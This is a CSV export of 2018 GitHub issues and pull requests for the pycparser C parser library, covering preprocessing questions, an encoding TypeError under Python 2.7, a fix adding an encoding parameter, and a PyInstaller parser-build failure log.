eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/298,390215981,MDU6SXNzdWUzOTAyMTU5ODE=,298,How to analysis C source files in a big C project ??Using Clang to do preprocess.,31725114,closed,FALSE,NA,NA,5,2018-12-12T13:01:47Z,2018-12-14T13:01:18Z,2018-12-13T03:46:24Z,NONE,NA,"![image](https://user-images.githubusercontent.com/31725114/49871218-94acee00-fe50-11e8-893a-58f472e1c153.png)
I mean some cpp args are included in makefile or else.
Need I extract them from makefile and write them in cpp_args of parse_file function in python scripts?",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/298/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/298/comments,https://api.github.com/repos/eliben/pycparser/issues/298/events,https://github.com/eliben/pycparser/issues/298,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/297,388644146,MDExOlB1bGxSZXF1ZXN0MjM2ODU5NjM0,297,Extended and cleaned up #pragma test cases,1473799,closed,FALSE,NA,NA,0,2018-12-07T12:56:03Z,2018-12-07T17:24:37Z,2018-12-07T17:24:37Z,CONTRIBUTOR,NA,Nothing fancy,NA,TRUE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/297/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/297/comments,https://api.github.com/repos/eliben/pycparser/issues/297/events,https://github.com/eliben/pycparser/pull/297,https://api.github.com/repos/eliben/pycparser/pulls/297
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/296,388091050,MDU6SXNzdWUzODgwOTEwNTA=,296,TypeError: __init__() got an unexpected keyword argument 'encoding' while run both using_gcc_E_libc.py and using_cpp_libc.py,22376205,closed,FALSE,NA,NA,3,2018-12-06T07:37:50Z,2018-12-06T13:16:19Z,2018-12-06T13:16:19Z,NONE,NA,"i could run c-to-c.py succesfully, but when i run using_gcc_E_libc.py and using_cpp_libc.py i got same error:TypeError: __init__() got an unexpected keyword argument 'encoding'.
1. when i run using_cpp_libc.py in root directory i got :
```
root@hw103:/home/yky/pycparser/pycparser# python examples/using_cpp_libc.py 
Traceback (most recent call last):
  File ""examples/using_cpp_libc.py"", line 29, in <module>
    cpp_args=r'-Iutils/fake_libc_include')
  File ""./pycparser/__init__.py"", line 89, in parse_file
    text = preprocess_file(filename, cpp_path, cpp_args, encoding)
  File ""./pycparser/__init__.py"", line 45, in preprocess_file
    text = check_output(path_list, universal_newlines=True, encoding=encoding)
  File ""/usr/lib/python2.7/subprocess.py"", line 567, in check_output
    process = Popen(stdout=PIPE, *popenargs, **kwargs)
TypeError: __init__() got an unexpected keyword argument 'encoding'
```
2.  when i run using_gcc_E_libc.py in root directory i got :
```
root@hw103:/home/yky/pycparser/pycparser# python examples/using_gcc_E_libc.py 
Traceback (most recent call last):
  File ""examples/using_gcc_E_libc.py"", line 29, in <module>
    cpp_args=['-E', r'-Iutils/fake_libc_include'])
  File ""./pycparser/__init__.py"", line 89, in parse_file
    text = preprocess_file(filename, cpp_path, cpp_args, encoding)
  File ""./pycparser/__init__.py"", line 45, in preprocess_file
    text = check_output(path_list, universal_newlines=True, encoding=encoding)
  File ""/usr/lib/python2.7/subprocess.py"", line 567, in check_output
    process = Popen(stdout=PIPE, *popenargs, **kwargs)
TypeError: __init__() got an unexpected keyword argument 'encoding'
```
3. information of cpp  and gcc in my computer
```
root@hw103:/home/yky/pycparser/pycparser# which cpp
/usr/bin/cpp
root@hw103:/home/yky/pycparser/pycparser# cpp --version
cpp (Ubuntu 5.4.0-6ubuntu1~16.04.10) 5.4.0 20160609
Copyright (C) 2015 Free Software Foundation, Inc.
This is free software; see the source for copying conditions.  There is NO
warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
```

````
root@hw103:/home/yky/pycparser/pycparser# which gcc 
/usr/bin/gcc
root@hw103:/home/yky/pycparser/pycparser# gcc --version
gcc (Ubuntu 5.4.0-6ubuntu1~16.04.10) 5.4.0 20160609
Copyright (C) 2015 Free Software Foundation, Inc.
This is free software; see the source for copying conditions.  There is NO
warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/296/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/296/comments,https://api.github.com/repos/eliben/pycparser/issues/296/events,https://github.com/eliben/pycparser/issues/296,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/295,387197055,MDExOlB1bGxSZXF1ZXN0MjM1NzM4MzI1,295,Fix encoding problem by adding `encoding` parameter to parse_file function,18619226,closed,FALSE,NA,NA,1,2018-12-04T09:39:42Z,2018-12-06T13:15:45Z,2018-12-04T12:53:34Z,CONTRIBUTOR,NA,"Fixes #293

Description:
For some Chinese Unicode c files, parse_file may fail if not providing proper `encoding` information. Adding `encoding` parameter will give users the option of providing correct file encoding.",NA,TRUE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/295/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/295/comments,https://api.github.com/repos/eliben/pycparser/issues/295/events,https://github.com/eliben/pycparser/pull/295,https://api.github.com/repos/eliben/pycparser/pulls/295
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/294,386469175,MDExOlB1bGxSZXF1ZXN0MjM1MjAwMTA5,294,Fix encoding problem by adding `kwargs` parameter to parse_file function,18619226,closed,FALSE,NA,NA,0,2018-12-01T15:42:29Z,2018-12-04T14:14:30Z,2018-12-04T09:38:36Z,CONTRIBUTOR,NA,"Fixes #293 

Description:
For some Chinese Unicode c files, parse_file may fail if not providing proper `encoding` information. Adding `kwargs` parameter will give users the option of providing `encoding` and other parameters necessary for correct parsing.",NA,TRUE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/294/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/294/comments,https://api.github.com/repos/eliben/pycparser/issues/294/events,https://github.com/eliben/pycparser/pull/294,https://api.github.com/repos/eliben/pycparser/pulls/294
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/293,386442871,MDU6SXNzdWUzODY0NDI4NzE=,293,parsing some unicode file failed,18619226,closed,FALSE,NA,NA,2,2018-12-01T09:48:37Z,2018-12-04T12:53:34Z,2018-12-04T12:53:34Z,CONTRIBUTOR,NA,"when parsing some unicode files with function parse_file, the following error occured
`String contains invalid escape code`

After debugging the code, i found `parse_file->preprocess_file->check_output` did not have the `encoding` parameter. if changing the code from file `pycparser\__init__.py:42` to this
` text = check_output(path_list, universal_newlines=True, encoding='utf-8')`
the error disappears

Howerver, i think the correct way to fix this problem is to give users the option to pass `encoding` parameter, and other parameters as well. 
So i suggest adding `**kwargs` to function parse_file and preprocess_file, i am not sure whether i am right or not @eliben ",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/293/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/293/comments,https://api.github.com/repos/eliben/pycparser/issues/293/events,https://github.com/eliben/pycparser/issues/293,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/292,385873470,MDU6SXNzdWUzODU4NzM0NzA=,292,How do I reverse byte order of constants before printing? ,25068226,closed,FALSE,NA,NA,5,2018-11-29T18:43:53Z,2018-12-01T13:24:28Z,2018-11-30T14:19:55Z,NONE,NA,"Hello,
I am trying to figure out how to reverse the byte order of constants in C code before printing them. I initially tried to use the Constant class but I need the names of the constants too and the constant class only provides the value and type. My goal is to parse C code and be able to reverse the byte order of all constants (e.g 0x85A308D3 -> 0xD308A385) and also have the names of those constants. Do you have any ideas that would point me in the right direction? This is what I have so far...Appreciate any insight!

`from __future__ import print_function
import sys
sys.path.extend(['.', '..'])

from pycparser import c_parser, c_ast, parse_file

def show_tree(filename):
    ast = parse_file(filename, use_cpp=True,cpp_args=['-E', r'-Iutils/fake_libc_include'])
    ast_buffer_write=open(""buffer.txt"",""w"") # here will be your AST source
    ast.show(ast_buffer_write,attrnames=True)
    ast_buffer_write.close()
    
if __name__ == ""__main__"":
    if len(sys.argv) > 1:
        filename  = sys.argv[1]
    else:
        filename = 'xmrig-master/src/crypto/c_blake256.c'

    show_tree(filename)`

 ",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/292/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/292/comments,https://api.github.com/repos/eliben/pycparser/issues/292/events,https://github.com/eliben/pycparser/issues/292,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/291,381748130,MDU6SXNzdWUzODE3NDgxMzA=,291,ERROR: start symbol translation_unit_or_empty undefined,574156,closed,FALSE,NA,NA,4,2018-11-16T20:26:32Z,2019-09-24T16:10:39Z,2019-08-26T22:13:38Z,NONE,NA,"When I run pyinstaller3.4 on windows 10 64bit (python3.6 64bit) I got this error (pycparser  2.19):
```
C:\Program Files\Python36\lib\site-packages\pycparser\c_parser.py:20: RuntimeWarning: parsing methods must have __doc__ for pycparser to work properly
  class CParser(PLYParser):
WARNING: There was a problem loading the table file: KeyError('p_direct_id_declarator_1',)
WARNING: C:\Program Files\Python36\lib\site-packages\pycparser\c_parser.py:513: No documentation string specified in function 'p_translation_unit_or_empty' (ignored)
WARNING: C:\Program Files\Python36\lib\site-packages\pycparser\c_parser.py:522: No documentation string specified in function 'p_translation_unit_1' (ignored)
WARNING: C:\Program Files\Python36\lib\site-packages\pycparser\c_parser.py:529: No documentation string specified in function 'p_translation_unit_2' (ignored)
WARNING: C:\Program Files\Python36\lib\site-packages\pycparser\c_parser.py:541: No documentation string specified in function 'p_external_declaration_1' (ignored)
WARNING: C:\Program Files\Python36\lib\site-packages\pycparser\c_parser.py:546: No documentation string specified in function 'p_external_declaration_2' (ignored)
WARNING: C:\Program Files\Python36\lib\site-packages\pycparser\c_parser.py:551: No documentation string specified in function 'p_external_declaration_3' (ignored)
WARNING: C:\Program Files\Python36\lib\site-packages\pycparser\c_parser.py:557: No documentation string specified in function 'p_external_declaration_4' (ignored)
WARNING: C:\Program Files\Python36\lib\site-packages\pycparser\c_parser.py:562: No documentation string specified in function 'p_pp_directive' (ignored)
WARNING: C:\Program Files\Python36\lib\site-packages\pycparser\c_parser.py:568: No documentation string specified in function 'p_pppragma_directive' (ignored)
WARNING: C:\Program Files\Python36\lib\site-packages\pycparser\c_parser.py:580: No documentation string specified in function 'p_function_definition_1' (ignored)
WARNING: C:\Program Files\Python36\lib\site-packages\pycparser\c_parser.py:597: No documentation string specified in function 'p_function_definition_2' (ignored)
WARNING: C:\Program Files\Python36\lib\site-packages\pycparser\c_parser.py:608: No documentation string specified in function 'p_statement' (ignored)
WARNING: C:\Program Files\Python36\lib\site-packages\pycparser\c_parser.py:661: No documentation string specified in function 'p_pragmacomp_or_statement' (ignored)
WARNING: C:\Program Files\Python36\lib\site-packages\pycparser\c_parser.py:681: No documentation string specified in function 'p_decl_body' (ignored)
WARNING: C:\Program Files\Python36\lib\site-packages\pycparser\c_parser.py:741: No documentation string specified in function 'p_declaration' (ignored)
WARNING: C:\Program Files\Python36\lib\site-packages\pycparser\c_parser.py:750: No documentation string specified in function 'p_declaration_list' (ignored)
WARNING: C:\Program Files\Python36\lib\site-packages\pycparser\c_parser.py:761: No documentation string specified in function 'p_declaration_specifiers_no_type_1' (ignored)
WARNING: C:\Program Files\Python36\lib\site-packages\pycparser\c_parser.py:766: No documentation string specified in function 'p_declaration_specifiers_no_type_2' (ignored)
WARNING: C:\Program Files\Python36\lib\site-packages\pycparser\c_parser.py:771: No documentation string specified in function 'p_declaration_specifiers_no_type_3' (ignored)
WARNING: C:\Program Files\Python36\lib\site-packages\pycparser\c_parser.py:777: No documentation string specified in function 'p_declaration_specifiers_1' (ignored)
WARNING: C:\Program Files\Python36\lib\site-packages\pycparser\c_parser.py:782: No documentation string specified in function 'p_declaration_specifiers_2' (ignored)
WARNING: C:\Program Files\Python36\lib\site-packages\pycparser\c_parser.py:787: No documentation string specified in function 'p_declaration_specifiers_3' (ignored)
WARNING: C:\Program Files\Python36\lib\site-packages\pycparser\c_parser.py:792: No documentation string specified in function 'p_declaration_specifiers_4' (ignored)
WARNING: C:\Program Files\Python36\lib\site-packages\pycparser\c_parser.py:797: No documentation string specified in function 'p_declaration_specifiers_5' (ignored)
WARNING: C:\Program Files\Python36\lib\site-packages\pycparser\c_parser.py:802: No documentation string specified in function 'p_declaration_specifiers_6' (ignored)
WARNING: C:\Program Files\Python36\lib\site-packages\pycparser\c_parser.py:808: No documentation string specified in function 'p_storage_class_specifier' (ignored)
WARNING: C:\Program Files\Python36\lib\site-packages\pycparser\c_parser.py:817: No documentation string specified in function 'p_function_specifier' (ignored)
WARNING: C:\Program Files\Python36\lib\site-packages\pycparser\c_parser.py:822: No documentation string specified in function 'p_type_specifier_no_typeid' (ignored)
WARNING: C:\Program Files\Python36\lib\site-packages\pycparser\c_parser.py:838: No documentation string specified in function 'p_type_specifier' (ignored)
WARNING: C:\Program Files\Python36\lib\site-packages\pycparser\c_parser.py:846: No documentation string specified in function 'p_type_qualifier' (ignored)
WARNING: C:\Program Files\Python36\lib\site-packages\pycparser\c_parser.py:853: No documentation string specified in function 'p_init_declarator_list' (ignored)
WARNING: C:\Program Files\Python36\lib\site-packages\pycparser\c_parser.py:862: No documentation string specified in function 'p_init_declarator' (ignored)
WARNING: C:\Program Files\Python36\lib\site-packages\pycparser\c_parser.py:868: No documentation string specified in function 'p_id_init_declarator_list' (ignored)
WARNING: C:\Program Files\Python36\lib\site-packages\pycparser\c_parser.py:874: No documentation string specified in function 'p_id_init_declarator' (ignored)
WARNING: C:\Program Files\Python36\lib\site-packages\pycparser\c_parser.py:882: No documentation string specified in function 'p_specifier_qualifier_list_1' (ignored)
WARNING: C:\Program Files\Python36\lib\site-packages\pycparser\c_parser.py:887: No documentation string specified in function 'p_specifier_qualifier_list_2' (ignored)
WARNING: C:\Program Files\Python36\lib\site-packages\pycparser\c_parser.py:892: No documentation string specified in function 'p_specifier_qualifier_list_3' (ignored)
WARNING: C:\Program Files\Python36\lib\site-packages\pycparser\c_parser.py:897: No documentation string specified in function 'p_specifier_qualifier_list_4' (ignored)
WARNING: C:\Program Files\Python36\lib\site-packages\pycparser\c_parser.py:906: No documentation string specified in function 'p_struct_or_union_specifier_1' (ignored)
WARNING: C:\Program Files\Python36\lib\site-packages\pycparser\c_parser.py:917: No documentation string specified in function 'p_struct_or_union_specifier_2' (ignored)
WARNING: C:\Program Files\Python36\lib\site-packages\pycparser\c_parser.py:935: No documentation string specified in function 'p_struct_or_union_specifier_3' (ignored)
WARNING: C:\Program Files\Python36\lib\site-packages\pycparser\c_parser.py:954: No documentation string specified in function 'p_struct_or_union' (ignored)
WARNING: C:\Program Files\Python36\lib\site-packages\pycparser\c_parser.py:962: No documentation string specified in function 'p_struct_declaration_list' (ignored)
WARNING: C:\Program Files\Python36\lib\site-packages\pycparser\c_parser.py:971: No documentation string specified in function 'p_struct_declaration_1' (ignored)
WARNING: C:\Program Files\Python36\lib\site-packages\pycparser\c_parser.py:1009: No documentation string specified in function 'p_struct_declaration_2' (ignored)
WARNING: C:\Program Files\Python36\lib\site-packages\pycparser\c_parser.py:1014: No documentation string specified in function 'p_struct_declaration_3' (ignored)
WARNING: C:\Program Files\Python36\lib\site-packages\pycparser\c_parser.py:1019: No documentation string specified in function 'p_struct_declarator_list' (ignored)
WARNING: C:\Program Files\Python36\lib\site-packages\pycparser\c_parser.py:1028: No documentation string specified in function 'p_struct_declarator_1' (ignored)
WARNING: C:\Program Files\Python36\lib\site-packages\pycparser\c_parser.py:1033: No documentation string specified in function 'p_struct_declarator_2' (ignored)
WARNING: C:\Program Files\Python36\lib\site-packages\pycparser\c_parser.py:1042: No documentation string specified in function 'p_enum_specifier_1' (ignored)
WARNING: C:\Program Files\Python36\lib\site-packages\pycparser\c_parser.py:1048: No documentation string specified in function 'p_enum_specifier_2' (ignored)
WARNING: C:\Program Files\Python36\lib\site-packages\pycparser\c_parser.py:1053: No documentation string specified in function 'p_enum_specifier_3' (ignored)
WARNING: C:\Program Files\Python36\lib\site-packages\pycparser\c_parser.py:1059: No documentation string specified in function 'p_enumerator_list' (ignored)
WARNING: C:\Program Files\Python36\lib\site-packages\pycparser\c_parser.py:1072: No documentation string specified in function 'p_enumerator' (ignored)
WARNING: C:\Program Files\Python36\lib\site-packages\pycparser\c_parser.py:1088: No documentation string specified in function 'p_declarator' (ignored)
WARNING: C:\Program Files\Python36\lib\site-packages\pycparser\c_parser.py:1200: No documentation string specified in function 'p_pointer' (ignored)
WARNING: C:\Program Files\Python36\lib\site-packages\pycparser\c_parser.py:1230: No documentation string specified in function 'p_type_qualifier_list' (ignored)
WARNING: C:\Program Files\Python36\lib\site-packages\pycparser\c_parser.py:1236: No documentation string specified in function 'p_parameter_type_list' (ignored)
WARNING: C:\Program Files\Python36\lib\site-packages\pycparser\c_parser.py:1245: No documentation string specified in function 'p_parameter_list' (ignored)
WARNING: C:\Program Files\Python36\lib\site-packages\pycparser\c_parser.py:1265: No documentation string specified in function 'p_parameter_declaration_1' (ignored)
WARNING: C:\Program Files\Python36\lib\site-packages\pycparser\c_parser.py:1277: No documentation string specified in function 'p_parameter_declaration_2' (ignored)
WARNING: C:\Program Files\Python36\lib\site-packages\pycparser\c_parser.py:1308: No documentation string specified in function 'p_identifier_list' (ignored)
WARNING: C:\Program Files\Python36\lib\site-packages\pycparser\c_parser.py:1318: No documentation string specified in function 'p_initializer_1' (ignored)
WARNING: C:\Program Files\Python36\lib\site-packages\pycparser\c_parser.py:1323: No documentation string specified in function 'p_initializer_2' (ignored)
WARNING: C:\Program Files\Python36\lib\site-packages\pycparser\c_parser.py:1332: No documentation string specified in function 'p_initializer_list' (ignored)
WARNING: C:\Program Files\Python36\lib\site-packages\pycparser\c_parser.py:1344: No documentation string specified in function 'p_designation' (ignored)
WARNING: C:\Program Files\Python36\lib\site-packages\pycparser\c_parser.py:1352: No documentation string specified in function 'p_designator_list' (ignored)
WARNING: C:\Program Files\Python36\lib\site-packages\pycparser\c_parser.py:1358: No documentation string specified in function 'p_designator' (ignored)
WARNING: C:\Program Files\Python36\lib\site-packages\pycparser\c_parser.py:1364: No documentation string specified in function 'p_type_name' (ignored)
WARNING: C:\Program Files\Python36\lib\site-packages\pycparser\c_parser.py:1375: No documentation string specified in function 'p_abstract_declarator_1' (ignored)
WARNING: C:\Program Files\Python36\lib\site-packages\pycparser\c_parser.py:1383: No documentation string specified in function 'p_abstract_declarator_2' (ignored)
WARNING: C:\Program Files\Python36\lib\site-packages\pycparser\c_parser.py:1388: No documentation string specified in function 'p_abstract_declarator_3' (ignored)
WARNING: C:\Program Files\Python36\lib\site-packages\pycparser\c_parser.py:1398: No documentation string specified in function 'p_direct_abstract_declarator_1' (ignored)
WARNING: C:\Program Files\Python36\lib\site-packages\pycparser\c_parser.py:1402: No documentation string specified in function 'p_direct_abstract_declarator_2' (ignored)
WARNING: C:\Program Files\Python36\lib\site-packages\pycparser\c_parser.py:1413: No documentation string specified in function 'p_direct_abstract_declarator_3' (ignored)
WARNING: C:\Program Files\Python36\lib\site-packages\pycparser\c_parser.py:1422: No documentation string specified in function 'p_direct_abstract_declarator_4' (ignored)
WARNING: C:\Program Files\Python36\lib\site-packages\pycparser\c_parser.py:1433: No documentation string specified in function 'p_direct_abstract_declarator_5' (ignored)
WARNING: C:\Program Files\Python36\lib\site-packages\pycparser\c_parser.py:1442: No documentation string specified in function 'p_direct_abstract_declarator_6' (ignored)
WARNING: C:\Program Files\Python36\lib\site-packages\pycparser\c_parser.py:1452: No documentation string specified in function 'p_direct_abstract_declarator_7' (ignored)
WARNING: C:\Program Files\Python36\lib\site-packages\pycparser\c_parser.py:1463: No documentation string specified in function 'p_block_item' (ignored)
WARNING: C:\Program Files\Python36\lib\site-packages\pycparser\c_parser.py:1471: No documentation string specified in function 'p_block_item_list' (ignored)
WARNING: C:\Program Files\Python36\lib\site-packages\pycparser\c_parser.py:1478: No documentation string specified in function 'p_compound_statement_1' (ignored)
WARNING: C:\Program Files\Python36\lib\site-packages\pycparser\c_parser.py:1484: No documentation string specified in function 'p_labeled_statement_1' (ignored)
WARNING: C:\Program Files\Python36\lib\site-packages\pycparser\c_parser.py:1488: No documentation string specified in function 'p_labeled_statement_2' (ignored)
WARNING: C:\Program Files\Python36\lib\site-packages\pycparser\c_parser.py:1492: No documentation string specified in function 'p_labeled_statement_3' (ignored)
WARNING: C:\Program Files\Python36\lib\site-packages\pycparser\c_parser.py:1496: No documentation string specified in function 'p_selection_statement_1' (ignored)
WARNING: C:\Program Files\Python36\lib\site-packages\pycparser\c_parser.py:1500: No documentation string specified in function 'p_selection_statement_2' (ignored)
WARNING: C:\Program Files\Python36\lib\site-packages\pycparser\c_parser.py:1504: No documentation string specified in function 'p_selection_statement_3' (ignored)
WARNING: C:\Program Files\Python36\lib\site-packages\pycparser\c_parser.py:1509: No documentation string specified in function 'p_iteration_statement_1' (ignored)
WARNING: C:\Program Files\Python36\lib\site-packages\pycparser\c_parser.py:1513: No documentation string specified in function 'p_iteration_statement_2' (ignored)
WARNING: C:\Program Files\Python36\lib\site-packages\pycparser\c_parser.py:1517: No documentation string specified in function 'p_iteration_statement_3' (ignored)
WARNING: C:\Program Files\Python36\lib\site-packages\pycparser\c_parser.py:1521: No documentation string specified in function 'p_iteration_statement_4' (ignored)
WARNING: C:\Program Files\Python36\lib\site-packages\pycparser\c_parser.py:1526: No documentation string specified in function 'p_jump_statement_1' (ignored)
WARNING: C:\Program Files\Python36\lib\site-packages\pycparser\c_parser.py:1530: No documentation string specified in function 'p_jump_statement_2' (ignored)
WARNING: C:\Program Files\Python36\lib\site-packages\pycparser\c_parser.py:1534: No documentation string specified in function 'p_jump_statement_3' (ignored)
WARNING: C:\Program Files\Python36\lib\site-packages\pycparser\c_parser.py:1538: No documentation string specified in function 'p_jump_statement_4' (ignored)
WARNING: C:\Program Files\Python36\lib\site-packages\pycparser\c_parser.py:1544: No documentation string specified in function 'p_expression_statement' (ignored)
WARNING: C:\Program Files\Python36\lib\site-packages\pycparser\c_parser.py:1551: No documentation string specified in function 'p_expression' (ignored)
WARNING: C:\Program Files\Python36\lib\site-packages\pycparser\c_parser.py:1564: No documentation string specified in function 'p_typedef_name' (ignored)
WARNING: C:\Program Files\Python36\lib\site-packages\pycparser\c_parser.py:1568: No documentation string specified in function 'p_assignment_expression' (ignored)
WARNING: C:\Program Files\Python36\lib\site-packages\pycparser\c_parser.py:1582: No documentation string specified in function 'p_assignment_operator' (ignored)
WARNING: C:\Program Files\Python36\lib\site-packages\pycparser\c_parser.py:1597: No documentation string specified in function 'p_constant_expression' (ignored)
WARNING: C:\Program Files\Python36\lib\site-packages\pycparser\c_parser.py:1601: No documentation string specified in function 'p_conditional_expression' (ignored)
WARNING: C:\Program Files\Python36\lib\site-packages\pycparser\c_parser.py:1610: No documentation string specified in function 'p_binary_expression' (ignored)
WARNING: C:\Program Files\Python36\lib\site-packages\pycparser\c_parser.py:1636: No documentation string specified in function 'p_cast_expression_1' (ignored)
WARNING: C:\Program Files\Python36\lib\site-packages\pycparser\c_parser.py:1640: No documentation string specified in function 'p_cast_expression_2' (ignored)
WARNING: C:\Program Files\Python36\lib\site-packages\pycparser\c_parser.py:1644: No documentation string specified in function 'p_unary_expression_1' (ignored)
WARNING: C:\Program Files\Python36\lib\site-packages\pycparser\c_parser.py:1648: No documentation string specified in function 'p_unary_expression_2' (ignored)
WARNING: C:\Program Files\Python36\lib\site-packages\pycparser\c_parser.py:1655: No documentation string specified in function 'p_unary_expression_3' (ignored)
WARNING: C:\Program Files\Python36\lib\site-packages\pycparser\c_parser.py:1664: No documentation string specified in function 'p_unary_operator' (ignored)
WARNING: C:\Program Files\Python36\lib\site-packages\pycparser\c_parser.py:1674: No documentation string specified in function 'p_postfix_expression_1' (ignored)
WARNING: C:\Program Files\Python36\lib\site-packages\pycparser\c_parser.py:1678: No documentation string specified in function 'p_postfix_expression_2' (ignored)
WARNING: C:\Program Files\Python36\lib\site-packages\pycparser\c_parser.py:1682: No documentation string specified in function 'p_postfix_expression_3' (ignored)
WARNING: C:\Program Files\Python36\lib\site-packages\pycparser\c_parser.py:1688: No documentation string specified in function 'p_postfix_expression_4' (ignored)
WARNING: C:\Program Files\Python36\lib\site-packages\pycparser\c_parser.py:1697: No documentation string specified in function 'p_postfix_expression_5' (ignored)
WARNING: C:\Program Files\Python36\lib\site-packages\pycparser\c_parser.py:1703: No documentation string specified in function 'p_postfix_expression_6' (ignored)
WARNING: C:\Program Files\Python36\lib\site-packages\pycparser\c_parser.py:1709: No documentation string specified in function 'p_primary_expression_1' (ignored)
WARNING: C:\Program Files\Python36\lib\site-packages\pycparser\c_parser.py:1713: No documentation string specified in function 'p_primary_expression_2' (ignored)
WARNING: C:\Program Files\Python36\lib\site-packages\pycparser\c_parser.py:1717: No documentation string specified in function 'p_primary_expression_3' (ignored)
WARNING: C:\Program Files\Python36\lib\site-packages\pycparser\c_parser.py:1723: No documentation string specified in function 'p_primary_expression_4' (ignored)
WARNING: C:\Program Files\Python36\lib\site-packages\pycparser\c_parser.py:1727: No documentation string specified in function 'p_primary_expression_5' (ignored)
WARNING: C:\Program Files\Python36\lib\site-packages\pycparser\c_parser.py:1735: No documentation string specified in function 'p_offsetof_member_designator' (ignored)
WARNING: C:\Program Files\Python36\lib\site-packages\pycparser\c_parser.py:1750: No documentation string specified in function 'p_argument_expression_list' (ignored)
WARNING: C:\Program Files\Python36\lib\site-packages\pycparser\c_parser.py:1760: No documentation string specified in function 'p_identifier' (ignored)
WARNING: C:\Program Files\Python36\lib\site-packages\pycparser\c_parser.py:1764: No documentation string specified in function 'p_constant_1' (ignored)
WARNING: C:\Program Files\Python36\lib\site-packages\pycparser\c_parser.py:1773: No documentation string specified in function 'p_constant_2' (ignored)
WARNING: C:\Program Files\Python36\lib\site-packages\pycparser\c_parser.py:1790: No documentation string specified in function 'p_constant_3' (ignored)
WARNING: C:\Program Files\Python36\lib\site-packages\pycparser\c_parser.py:1802: No documentation string specified in function 'p_unified_string_literal' (ignored)
WARNING: C:\Program Files\Python36\lib\site-packages\pycparser\c_parser.py:1813: No documentation string specified in function 'p_unified_wstring_literal' (ignored)
WARNING: C:\Program Files\Python36\lib\site-packages\pycparser\c_parser.py:1824: No documentation string specified in function 'p_brace_open' (ignored)
WARNING: C:\Program Files\Python36\lib\site-packages\pycparser\c_parser.py:1830: No documentation string specified in function 'p_brace_close' (ignored)
WARNING: C:\Program Files\Python36\lib\site-packages\pycparser\c_parser.py:1836: No documentation string specified in function 'p_empty' (ignored)
ERROR: start symbol translation_unit_or_empty undefined
Traceback (most recent call last):
  File ""C:\Program Files\Python36\lib\runpy.py"", line 183, in _run_module_as_main
    mod_name, mod_spec, code = _get_module_details(mod_name, _Error)
  File ""C:\Program Files\Python36\lib\runpy.py"", line 142, in _get_module_details
    return _get_module_details(pkg_main_name, error)
  File ""C:\Program Files\Python36\lib\runpy.py"", line 109, in _get_module_details
    __import__(pkg_name)
  File ""C:\Program Files\Python36\lib\site-packages\PyInstaller\__init__.py"", line 16, in <module>
    from . import compat
  File ""C:\Program Files\Python36\lib\site-packages\PyInstaller\compat.py"", line 212, in <module>
    from win32ctypes.pywin32 import pywintypes  # noqa: F401
  File ""C:\Program Files\Python36\lib\site-packages\win32ctypes\pywin32\__init__.py"", line 11, in <module>
    from win32ctypes.pywin32 import win32api
  File ""C:\Program Files\Python36\lib\site-packages\win32ctypes\pywin32\win32api.py"", line 12, in <module>
    from win32ctypes.core import (
  File ""<frozen importlib._bootstrap>"", line 971, in _find_and_load
  File ""<frozen importlib._bootstrap>"", line 955, in _find_and_load_unlocked
  File ""<frozen importlib._bootstrap>"", line 656, in _load_unlocked
  File ""<frozen importlib._bootstrap>"", line 626, in _load_backward_compatible
  File ""C:\Program Files\Python36\lib\site-packages\win32ctypes\core\__init__.py"", line 36, in load_module
    module = importlib.import_module(self.redirect_module)
  File ""C:\Program Files\Python36\lib\importlib\__init__.py"", line 126, in import_module
    return _bootstrap._gcd_import(name[level:], package, level)
  File ""C:\Program Files\Python36\lib\site-packages\win32ctypes\core\cffi\_common.py"", line 12, in <module>
    from ._util import ffi
  File ""C:\Program Files\Python36\lib\site-packages\win32ctypes\core\cffi\_util.py"", line 17, in <module>
    ffi.set_unicode(True)
  File ""C:\Program Files\Python36\lib\site-packages\cffi\api.py"", line 540, in set_unicode
    self.cdef(""typedef wchar_t TBYTE;""
  File ""C:\Program Files\Python36\lib\site-packages\cffi\api.py"", line 107, in cdef
    self._cdef(csource, override=override, packed=packed)
  File ""C:\Program Files\Python36\lib\site-packages\cffi\api.py"", line 121, in _cdef
    self._parser.parse(csource, override=override, **options)
  File ""C:\Program Files\Python36\lib\site-packages\cffi\cparser.py"", line 315, in parse
    self._internal_parse(csource)
  File ""C:\Program Files\Python36\lib\site-packages\cffi\cparser.py"", line 320, in _internal_parse
    ast, macros, csource = self._parse(csource)
  File ""C:\Program Files\Python36\lib\site-packages\cffi\cparser.py"", line 276, in _parse
    ast = _get_parser().parse(fullcsource)
  File ""C:\Program Files\Python36\lib\site-packages\cffi\cparser.py"", line 45, in _get_parser
    _parser_cache = pycparser.CParser()
  File ""C:\Program Files\Python36\lib\site-packages\pycparser\c_parser.py"", line 117, in __init__
    outputdir=taboutputdir)
  File ""C:\Program Files\Python36\lib\site-packages\pycparser\ply\yacc.py"", line 3352, in yacc
    raise YaccError('Unable to build parser')
pycparser.ply.yacc.YaccError: Unable to build parser
```

How to fix it?
